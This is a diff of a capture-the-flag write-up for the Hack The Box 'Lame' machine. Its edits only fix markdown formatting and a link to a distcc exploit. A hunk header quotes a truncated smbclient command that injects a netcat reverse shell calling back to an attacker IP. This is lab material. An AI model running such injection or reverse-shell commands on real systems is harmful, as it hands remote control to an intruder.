@@ -4,7 +4,7 @@ description: https://app.hackthebox.com/machines/1
 
 # Lame
 
-**Difficulty: **<mark style="color:green;">**EASY**</mark>
+**Difficulty:&#x20;**<mark style="color:green;">**EASY**</mark>
 
 ## Reconnaissance
 
@@ -144,7 +144,7 @@ smbclient  //10.10.10.3/tmp -N --command='logon "/=`nohup nc 10.10.14.25 443 -e 
 
 To exploit **distccd service** I'll use an exploit from **github.**
 
-* [https://github.com/angelpimentell/distcc\_cve\_2004-2687\_exploit](https://github.com/angelpimentell/distcc\_cve\_2004-2687\_exploit)
+* [https://github.com/angelpimentell/distcc\_cve\_2004-2687\_exploit](https://github.com/angelpimentell/distcc_cve_2004-2687_exploit)
 
 <figure><img src="../../../../.gitbook/assets/distexploit.png" alt=""><figcaption></figcaption></figure>
 
